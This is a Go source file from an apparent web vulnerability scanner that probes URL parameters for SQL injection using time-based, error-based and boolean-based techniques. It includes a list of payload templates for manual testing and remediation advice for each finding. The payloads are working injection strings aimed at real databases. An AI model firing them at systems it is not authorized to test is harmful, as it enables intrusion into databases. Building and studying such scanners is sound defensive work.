package injection

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"time"

	"github.com/mohseenjamall/apjson/pkg/config"
)

// InjectionType represents the type of injection vulnerability
type InjectionType string

const (
	SQLInjection     InjectionType = "SQL Injection"
	XSSInjection     InjectionType = "Cross-Site Scripting (XSS)"
	CommandInjection InjectionType = "Command Injection"
	LDAPInjection    InjectionType = "LDAP Injection"
	XMLInjection     InjectionType = "XML Injection"
	SSTIInjection    InjectionType = "Server-Side Template Injection"
)

// SQLiTechnique represents SQL injection detection technique
type SQLiTechnique string

const (
	TimeBased    SQLiTechnique = "Time-Based Blind"
	ErrorBased   SQLiTechnique = "Error-Based"
	BooleanBased SQLiTechnique = "Boolean-Based Blind"
	UnionBased   SQLiTechnique = "UNION-Based"
	StackedQuery SQLiTechnique = "Stacked Queries"
)

// Vulnerability represents a detected injection vulnerability
type Vulnerability struct {
	Type        InjectionType
	Technique   SQLiTechnique
	URL         string
	Parameter   string
	Payload     string
	Evidence    string
	Severity    string
	Confidence  float64
	Description string
	Remediation string
}

// Tester performs injection vulnerability testing
type Tester struct {
	config       *config.Config
	client       *http.Client
	timeBaseline time.Duration
}

// NewTester creates a new injection tester
func NewTester(cfg *config.Config) *Tester {
	return &Tester{
		config: cfg,
		client: &http.Client{
			Timeout: time.Duration(cfg.ScanTimeout) * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
	}
}

// TestURL tests a URL and its parameters for injection vulnerabilities
func (t *Tester) TestURL(targetURL string) []Vulnerability {
	vulnerabilities := make([]Vulnerability, 0)

	// Parse URL and extract parameters
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return vulnerabilities
	}

	// No parameters to test
	if parsedURL.RawQuery == "" {
		return vulnerabilities
	}

	// Establish baseline response time
	t.establishBaseline(targetURL)

	// Test each parameter
	params := parsedURL.Query()
	for paramName := range params {
		// Test SQL Injection
		sqlVulns := t.testSQLInjection(targetURL, paramName)
		vulnerabilities = append(vulnerabilities, sqlVulns...)

		// TODO: Test XSS, Command Injection, etc.
	}

	return vulnerabilities
}

// establishBaseline measures normal response time for the target
func (t *Tester) establishBaseline(targetURL string) {
	start := time.Now()

	resp, err := t.client.Get(targetURL)
	if err != nil {
		t.timeBaseline = 1 * time.Second // Default baseline
		return
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	t.timeBaseline = time.Since(start)
}

// testSQLInjection tests for SQL injection vulnerabilities
func (t *Tester) testSQLInjection(targetURL, parameter string) []Vulnerability {
	vulnerabilities := make([]Vulnerability, 0)

	// Test time-based SQL injection
	timeBasedVuln := t.testTimeBasedSQLi(targetURL, parameter)
	if timeBasedVuln != nil {
		vulnerabilities = append(vulnerabilities, *timeBasedVuln)
	}

	// Test error-based SQL injection
	errorBasedVuln := t.testErrorBasedSQLi(targetURL, parameter)
	if errorBasedVuln != nil {
		vulnerabilities = append(vulnerabilities, *errorBasedVuln)
	}

	// Test boolean-based SQL injection
	booleanVuln := t.testBooleanBasedSQLi(targetURL, parameter)
	if booleanVuln != nil {
		vulnerabilities = append(vulnerabilities, *booleanVuln)
	}

	return vulnerabilities
}

// testTimeBasedSQLi tests for time-based blind SQL injection
func (t *Tester) testTimeBasedSQLi(targetURL, parameter string) *Vulnerability {
	// Time-based payloads for different databases
	payloads := []struct {
		payload  string
		database string
		delay    int
	}{
		// MySQL/MariaDB
		{"' AND SLEEP(5)-- ", "MySQL", 5},
		{"' OR SLEEP(5)-- ", "MySQL", 5},
		{"1' AND SLEEP(5)-- ", "MySQL", 5},

		// PostgreSQL
		{"'; SELECT pg_sleep(5)-- ", "PostgreSQL", 5},
		{"' OR pg_sleep(5)-- ", "PostgreSQL", 5},

		// MSSQL
		{"'; WAITFOR DELAY '0:0:5'-- ", "MSSQL", 5},
		{"' OR 1=1 WAITFOR DELAY '0:0:5'-- ", "MSSQL", 5},

		// SQLite
		{"' AND (SELECT 1 FROM (SELECT RANDOMBLOB(100000000)) WHERE 1)-- ", "SQLite", 3},
	}

	for _, p := range payloads {
		if vuln := t.testSingleTimeBasedPayload(targetURL, parameter, p.payload, p.database, p.delay); vuln != nil {
			return vuln
		}
	}

	return nil
}

// testSingleTimeBasedPayload tests a single time-based payload
func (t *Tester) testSingleTimeBasedPayload(targetURL, parameter, payload, database string, expectedDelay int) *Vulnerability {
	// Build URL with payload
	testURL := t.injectPayload(targetURL, parameter, payload)

	// Measure response time
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(expectedDelay+10)*time.Second)
	defer cancel()

	start := time.Now()
	req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
	if err != nil {
		return nil
	}

	req.Header.Set("User-Agent", t.config.UserAgent)

	resp, err := t.client.Do(req)
	elapsed := time.Since(start)

	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	// Check if response was delayed as expected
	expectedDuration := time.Duration(expectedDelay) * time.Second
	tolerance := 500 * time.Millisecond

	if elapsed >= (expectedDuration-tolerance) && elapsed <= (expectedDuration+2*time.Second) {
		return &Vulnerability{
			Type:       SQLInjection,
			Technique:  TimeBased,
			URL:        targetURL,
			Parameter:  parameter,
			Payload:    payload,
			Evidence:   fmt.Sprintf("Response delayed by %v (expected %v)", elapsed, expectedDuration),
			Severity:   "High",
			Confidence: 0.85,
			Description: fmt.Sprintf("Time-based SQL injection detected in parameter '%s'. The application delayed response by approximately %d seconds, indicating successful SQL injection for %s database.",
				parameter, expectedDelay, database),
			Remediation: "Use parameterized queries (prepared statements) or ORM frameworks. Never concatenate user input directly into SQL queries.",
		}
	}

	return nil
}

// testErrorBasedSQLi tests for error-based SQL injection
func (t *Tester) testErrorBasedSQLi(targetURL, parameter string) *Vulnerability {
	// Error-based payloads
	payloads := []string{
		"'",
		"\"",
		"' OR '1'='1",
		"' AND 1=CONVERT(int, (SELECT @@version))-- ",
		"' AND extractvalue(1,concat(0x7e,version()))-- ",
		"' AND 1=1 UNION SELECT NULL,NULL,NULL-- ",
	}

	// SQL error patterns
	errorPatterns := []struct {
		pattern  string
		database string
	}{
		{`SQL syntax.*MySQL`, "MySQL"},
		{`Warning.*mysql_`, "MySQL"},
		{`MySQLSyntaxErrorException`, "MySQL"},
		{`PostgreSQL.*ERROR`, "PostgreSQL"},
		{`pg_query\(\)`, "PostgreSQL"},
		{`Microsoft SQL Server`, "MSSQL"},
		{`ODBC SQL Server Driver`, "MSSQL"},
		{`SQLServer JDBC Driver`, "MSSQL"},
		{`Oracle error`, "Oracle"},
		{`ORA-\d{5}`, "Oracle"},
		{`sqlite3\.OperationalError`, "SQLite"},
		{`SQLite.*error`, "SQLite"},
	}

	for _, payload := range payloads {
		testURL := t.injectPayload(targetURL, parameter, payload)

		resp, err := t.client.Get(testURL)
		if err != nil {
			continue
		}

		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}

		bodyStr := string(body)

		// Check for SQL error patterns
		for _, errPattern := range errorPatterns {
			if matched, _ := regexp.MatchString(errPattern.pattern, bodyStr); matched {
				return &Vulnerability{
					Type:       SQLInjection,
					Technique:  ErrorBased,
					URL:        targetURL,
					Parameter:  parameter,
					Payload:    payload,
					Evidence:   fmt.Sprintf("SQL error detected: %s", t.extractEvidence(bodyStr, errPattern.pattern)),
					Severity:   "High",
					Confidence: 0.95,
					Description: fmt.Sprintf("Error-based SQL injection detected in parameter '%s'. The application returned %s database error messages.",
						parameter, errPattern.database),
					Remediation: "Use parameterized queries. Never expose database error messages to users. Implement proper error handling.",
				}
			}
		}
	}

	return nil
}

// testBooleanBasedSQLi tests for boolean-based blind SQL injection
func (t *Tester) testBooleanBasedSQLi(targetURL, parameter string) *Vulnerability {
	// Get baseline responses
	truePayload := "' OR '1'='1"
	falsePayload := "' AND '1'='2"

	trueURL := t.injectPayload(targetURL, parameter, truePayload)
	falseURL := t.injectPayload(targetURL, parameter, falsePayload)

	// Get normal response
	normalResp, err := t.client.Get(targetURL)
	if err != nil {
		return nil
	}
	normalBody, _ := io.ReadAll(normalResp.Body)
	normalResp.Body.Close()

	// Get "true" response
	trueResp, err := t.client.Get(trueURL)
	if err != nil {
		return nil
	}
	trueBody, _ := io.ReadAll(trueResp.Body)
	trueResp.Body.Close()

	// Get "false" response
	falseResp, err := t.client.Get(falseURL)
	if err != nil {
		return nil
	}
	falseBody, _ := io.ReadAll(falseResp.Body)
	falseResp.Body.Close()

	// Compare responses
	// True payload should behave like normal or show more results
	// False payload should show fewer/different results
	normalLen := len(normalBody)
	trueLen := len(trueBody)
	falseLen := len(falseBody)

	// Check for significant differences
	if (trueLen > falseLen && float64(trueLen-falseLen)/float64(normalLen) > 0.1) ||
		(trueResp.StatusCode != falseResp.StatusCode) {
		return &Vulnerability{
			Type:      SQLInjection,
			Technique: BooleanBased,
			URL:       targetURL,
			Parameter: parameter,
			Payload:   truePayload,
			Evidence: fmt.Sprintf("True response: %d bytes (status %d), False response: %d bytes (status %d)",
				trueLen, trueResp.StatusCode, falseLen, falseResp.StatusCode),
			Severity:    "High",
			Confidence:  0.75,
			Description: fmt.Sprintf("Boolean-based blind SQL injection detected in parameter '%s'. Application behavior differs based on SQL query result.", parameter),
			Remediation: "Use parameterized queries. Implement consistent error handling to prevent information leakage.",
		}
	}

	return nil
}

// injectPayload injects payload into URL parameter
func (t *Tester) injectPayload(targetURL, parameter, payload string) string {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return targetURL
	}

	params := parsedURL.Query()
	params.Set(parameter, payload)
	parsedURL.RawQuery = params.Encode()

	return parsedURL.String()
}

// extractEvidence extracts relevant evidence from response
func (t *Tester) extractEvidence(body, pattern string) string {
	re := regexp.MustCompile(pattern)
	match := re.FindString(body)
	if len(match) > 200 {
		return match[:200] + "..."
	}
	return match
}

// GetPayloadTemplates returns payload templates for manual testing
func GetPayloadTemplates() map[string][]string {
	return map[string][]string{
		"MySQL_TimeBased": {
			"' AND SLEEP(5)-- ",
			"1' AND SLEEP(5)-- ",
			"' OR SLEEP(5)-- ",
		},
		"PostgreSQL_TimeBased": {
			"'; SELECT pg_sleep(5)-- ",
			"' OR pg_sleep(5)-- ",
		},
		"MSSQL_TimeBased": {
			"'; WAITFOR DELAY '0:0:5'-- ",
			"' WAITFOR DELAY '0:0:5'-- ",
		},
		"Generic_ErrorBased": {
			"'",
			"\"",
			"' OR '1'='1",
			"' AND '1'='2",
		},
		"Generic_UnionBased": {
			"' UNION SELECT NULL-- ",
			"' UNION SELECT NULL,NULL-- ",
			"' UNION SELECT NULL,NULL,NULL-- ",
		},
	}
}
